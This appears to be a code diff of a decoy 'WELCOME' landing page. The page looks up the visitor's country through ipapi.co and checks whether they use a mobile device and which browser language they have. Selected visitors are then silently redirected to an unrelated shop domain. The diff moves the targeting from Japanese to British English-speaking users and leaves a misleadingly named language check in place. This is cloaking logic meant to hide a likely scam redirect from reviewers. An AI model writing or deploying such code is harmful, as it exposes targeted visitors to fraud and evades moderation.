@@ -3,15 +3,6 @@
 <html>
 <head>
     
-    <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
-<script>LA.init({id:"3O9YbZPyvpEqbsRc",ck:"3O9YbZPyvpEqbsRc"})</script>
-	 <!--
-	<script>
-		window.onload = function() {
-			window.location.href = "https://www.jacmsotck.online/rigufb/tbgu1online.html";
-		}
-	</script>
-     -->
 
   <title>WELCOME</title>
   <meta charset="utf-8">
@@ -46,15 +37,15 @@
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
- function isJapaneseLang() {
-    return navigator.language.startsWith('ja') || 
-           navigator.languages.some(lang => lang.startsWith('ja'));
+function isJapaneseLang() {
+    return navigator.language.startsWith('en') || 
+           navigator.languages.some(lang => lang.startsWith('en'));
 }
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'JP' && isMobileDevice() &&isJapaneseLang() ) {
+        if (data.country === 'GB' && isMobileDevice() &&isJapaneseLang() ) {
           window.location.href = "https://nkaigc.shop/?fbclid=fbclid";
           return;
         }
